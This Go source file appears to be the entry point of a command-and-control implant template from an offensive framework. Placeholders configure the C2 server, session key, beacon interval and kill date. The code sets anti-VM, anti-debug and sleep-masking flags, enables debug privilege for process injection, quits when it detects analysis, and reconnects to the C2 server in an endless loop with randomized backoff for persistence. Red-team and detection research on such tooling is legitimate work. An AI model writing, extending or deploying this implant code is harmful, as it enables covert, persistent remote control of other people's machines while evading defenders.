package main

import (
	"fmt"
	"log"
	mathrand "math/rand"
	"os"
	"time"
)

// Implant configuration - these will be replaced during compilation
// Do not remove any of these variables, they are used for the template
var (
	DefaultServerAddr = "{{.ServerAddr}}:{{.Port}}"
	TransportType     = "{{.Transport}}"
	SkipTLSVerify     = {{.SkipTLSVerify}}
	ListenerID        = "{{.ListenerID}}"
	SessionKey        = "{{.SessionKey}}"
	BeaconInterval    = int32({{.BeaconInterval}})
	JitterPercent     = int32({{.JitterPercent}})
	MaxRetries        = int32({{.MaxRetries}})
	GeneratedAt       = "{{.GeneratedAt}}"
	DebugMode    bool = {{.Debug}}
	// For development when template vars aren't available

	// Feature flags  
	EnablePTY   bool = {{.EnablePTY}}
	EnableFiles bool = {{.EnableFiles}}
	EnableProxy bool = {{.EnableProxy}}

	// Evasion flags
	AntiVM         bool = {{.AntiVM}}
	AntiDebug      bool = {{.AntiDebug}}
	SleepMask      bool = {{.SleepMask}}
	PersistentMode bool = {{.PersistentMode}} // Never exit due to evasion checks

{{if .KillDate}}
	KillDate = time.Date({{.KillDate.Year}}, {{.KillDate.Month}}, {{.KillDate.Day}}, {{.KillDate.Hour}}, {{.KillDate.Minute}}, {{.KillDate.Second}}, 0, time.UTC)
{{else}}
	KillDate time.Time // Zero time means no kill date
{{end}}
)

func main() {
	// Set lower process priority for stealth (Windows-specific, no-op on Unix)
	SetProcessPriority()
	
	// Enable debug privilege if possible (Windows-specific, allows process injection)
	EnableDebugPrivilege()
	
	// Initialize module manager
	InitModuleManager()

	// Perform initial evasion checks
	implant := &Implant{}
	if !implant.PerformEvasionChecks() {
		os.Exit(0)
	}

	serverAddr := DefaultServerAddr
	if len(os.Args) > 1 {
		serverAddr = os.Args[1]
	}

	// Infinite reconnection loop to ensure maximum persistence
	reconnectAttempt := 0
	for {
		// Perform evasion checks before each connection attempt
		// Skip evasion checks if persistent mode is enabled
		if !PersistentMode && !implant.PerformEvasionChecks() {
			os.Exit(0)
		}

		reconnectAttempt++
		if DebugMode {
			log.Printf("Connection attempt #%d to C2 server: %s", reconnectAttempt, serverAddr)
		}

		// Create new implant instance for each connection attempt
		implant = NewImplant(serverAddr)
		
		// Try to connect and run
		if err := runImplantSession(implant); err != nil {
			if DebugMode {
				log.Printf("Session ended (attempt #%d): %v", reconnectAttempt, err)
			}
			
			// Progressive backoff: start at 2-5 minutes, max out at 10-15 minutes
			baseBackoff := 120 // 2 minutes
			maxBackoff := 900  // 15 minutes
			
			// Calculate backoff with progressive increase
			backoffMultiplier := reconnectAttempt
			if backoffMultiplier > 5 {
				backoffMultiplier = 5 // Cap at 5x multiplier
			}
			
			backoffTime := baseBackoff + (backoffMultiplier * 60) + mathrand.Intn(180)
			if backoffTime > maxBackoff {
				backoffTime = maxBackoff - mathrand.Intn(300) // 10-15 minutes
			}
			
			backoffSleep := time.Duration(backoffTime) * time.Second
			if DebugMode {
				log.Printf("Waiting %v before reconnection attempt #%d...", backoffSleep, reconnectAttempt+1)
			}
			time.Sleep(backoffSleep)
			continue
		}
		
		// Reset attempt counter on successful connection
		reconnectAttempt = 0
	}
}

// runImplantSession handles a single implant session with the C2 server
func runImplantSession(implant *Implant) error {
	// Connect to C2 server
	if err := implant.Connect(); err != nil {
		return fmt.Errorf("failed to connect: %v", err)
	}
	defer implant.Close()

	// Register with server
	if DebugMode {
		log.Println("Registering with C2 server...")
	}
	if err := implant.Register(); err != nil {
		return fmt.Errorf("failed to register: %v", err)
	}

	if DebugMode {
		log.Printf("Starting beacon with %ds interval (+/- %d%% jitter)",
			implant.BeaconInterval, implant.JitterPercent)
	}

	// Start beacon stream (preferred method)
	if err := implant.StartBeaconStream(); err != nil {
		if DebugMode {
			log.Printf("Stream failed, falling back to polling: %v", err)
		}
		// Fallback to polling if streaming fails
		return implant.StartPolling()
	}
	
	return nil
}
